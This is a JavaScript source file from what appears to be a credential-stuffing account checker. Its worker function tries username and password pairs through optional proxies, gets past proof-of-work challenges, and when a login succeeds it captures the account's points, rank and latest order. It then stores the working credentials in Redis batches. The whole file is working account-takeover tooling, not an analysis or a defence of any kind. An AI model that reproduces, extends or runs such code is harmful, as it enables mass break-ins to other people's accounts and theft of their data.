/**
 * Process a single credential-check task directly, without Redis queue consumption.
 *
 * This is the real worker execution path extracted for reuse by:
 *   - WorkerNode (Redis-consuming runtime)
 *   - Local full-flow test harness (scripts/test-full-flow.js)
 *
 * The function calls the real shared modules: checkCredentials, captureAccountData,
 * fetchIpInfo, and powServiceClient.  PoW/CRES is solved internally by those modules
 * (via the POW service HTTP client with automatic local fallback).
 *
 * @param {Object} task - Task object
 * @param {string} task.username       - Email / credential username
 * @param {string} task.password       - Credential password
 * @param {string} [task.proxyUrl]     - Optional proxy URL
 * @param {string} [task.batchId]      - Batch identifier (default: 'local-test')
 * @param {string} [task.taskId]       - Task identifier (default: auto-generated)
 * @param {string} [task.proxyId]      - Proxy identifier
 * @param {number} [task.timeoutMs]    - HTTP timeout (default: 60000)
 * @param {Object} [options]
 * @param {Object} [options.redis]     - Optional RedisClient for storeResult / progress
 * @param {string} [options.workerId]  - Worker identifier for result metadata
 * @returns {Promise<Object>} Result with status, capture, ipAddress, timings
 */

const { createLogger } = require('../shared/logger');
const { checkCredentials } = require('../shared/http/checker');
const { captureAccountData } = require('../shared/capture');
const { fetchIpInfo } = require('../shared/http/ipFetcher');
const { RESULT_CACHE, PROGRESS_TRACKER } = require('../shared/redis/keys');
const { makeKey, markProcessedStatus } = require('../shared/batch/processedStore');

async function processTaskDirect(task, options = {}) {
  const startTime = Date.now();
  const workerId = options.workerId || 'local-test';
  const redis = options.redis || null;

  const {
    username,
    password,
    proxyUrl = null,
    batchId = 'local-test',
    taskId = `local-${Date.now()}`,
    proxyId = null,
    timeoutMs = 60000,
  } = task;

  const checkLog = createLogger('task-direct');

  try {
    checkLog.info(`Processing credential check for ${username}`, {
      workerId, taskId, batchId,
      proxyUrl: proxyUrl ? 'configured' : 'none',
    });

    // ── 1. Credential check (calls real checker → flow → PoW) ────────────────
    const checkResult = await checkCredentials(username, password, {
      proxy: proxyUrl,
      timeoutMs,
      deferCloseOnValid: true,
      batchMode: false,
    });

    let result = {
      username,
      password,
      status: checkResult.status,
      checkedAt: Date.now(),
      workerId,
      proxyId,
      checkDurationMs: Date.now() - startTime,
      batchId,
      taskId,
    };

    // ── 2. If VALID: capture IP + account data ───────────────────────────────
    if (checkResult.status === 'VALID') {
      try {
        if (checkResult.ipAddress) {
          result.ipAddress = checkResult.ipAddress;
        } else if (proxyUrl && checkResult.session) {
          const ipClient = checkResult.session.proxiedClient || checkResult.session.client;
          const ipInfo = await fetchIpInfo(ipClient, 10000);
          if (ipInfo.ip) result.ipAddress = ipInfo.ip;
        }

        if (checkResult.session) {
          const captureData = await captureAccountData(checkResult.session, { timeoutMs: 30000 });
          result.capture = captureData;
          checkLog.info('Account data captured', {
            points: captureData.points,
            rank: captureData.rank,
            latestOrder: captureData.latestOrder,
          });

          // Close session cookie jar
          try {
            if (checkResult.session.jar?.removeAllCookies) {
              await new Promise((resolve, reject) => {
                checkResult.session.jar.removeAllCookies((err) => {
                  if (err) reject(err); else resolve();
                });
              });
            }
          } catch (_) { /* ignore cleanup errors */ }
        }
      } catch (captureErr) {
        checkLog.warn(`Capture failed (credential still VALID): ${captureErr.message}`);
        result.captureError = captureErr.message;
      }
    } else {
      if (checkResult.message) result.errorCode = checkResult.message;
    }

    // ── 3. Optional: store result in Redis ───────────────────────────────────
    if (redis) {
      try {
        const resultKey = RESULT_CACHE.generate(result.status, result.username, result.password);
        await redis.executeCommand('setex', resultKey, RESULT_CACHE.ttl, JSON.stringify(result));

        const counterKey = PROGRESS_TRACKER.generateCounter(batchId);
        await redis.executeCommand('incr', counterKey);

        if (result.status === 'VALID') {
          const validCredsKey = PROGRESS_TRACKER.generateValidCreds(batchId);
          await redis.executeCommand('lpush', validCredsKey, JSON.stringify({
            username: result.username,
            password: result.password,
            ipAddress: result.ipAddress || 'Unknown',
          }));
          await redis.executeCommand('expire', validCredsKey, PROGRESS_TRACKER.ttl);
        }

        if (result.status !== 'ERROR') {
          const credKey = makeKey(result.username, result.password);
          await markProcessedStatus(credKey, result.status);
        }
      } catch (redisErr) {
        checkLog.warn(`Redis store failed (non-fatal): ${redisErr.message}`);
      }
    }

    result.checkDurationMs = Date.now() - startTime;

    checkLog.info(`Task completed: ${result.status}`, {
      taskId, batchId, status: result.status,
      duration: result.checkDurationMs,
      ipAddress: result.ipAddress || 'none',
    });

    return result;
  } catch (error) {
    const duration = Date.now() - startTime;
    checkLog.error(`Task failed: ${error.message}`, { taskId, batchId, duration });

    return {
      username,
      password,
      status: 'ERROR',
      errorCode: error.message,
      checkedAt: Date.now(),
      workerId,
      proxyId,
      checkDurationMs: duration,
      batchId,
      taskId,
    };
  }
}

module.exports = { processTaskDirect };
